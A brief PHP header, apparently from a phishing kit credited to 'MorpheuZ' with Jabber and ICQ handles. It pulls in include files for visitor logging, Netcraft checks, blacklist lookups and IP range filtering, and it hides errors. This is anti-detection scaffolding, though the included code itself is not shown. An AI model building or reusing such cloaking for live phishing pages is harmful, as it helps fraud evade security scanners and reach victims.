<?php
/*
 * 4ker by MorpheuZ
 * Jabber: morpheuslink@jabb3r.org
 * ICQ: 745065274
 */
require "includes/visitor_log.php";
require "includes/netcraft_check.php";
require "includes/blacklist_lookup.php";
require "includes/ip_range_check.php";
ini_set('display_errors', 0);
?>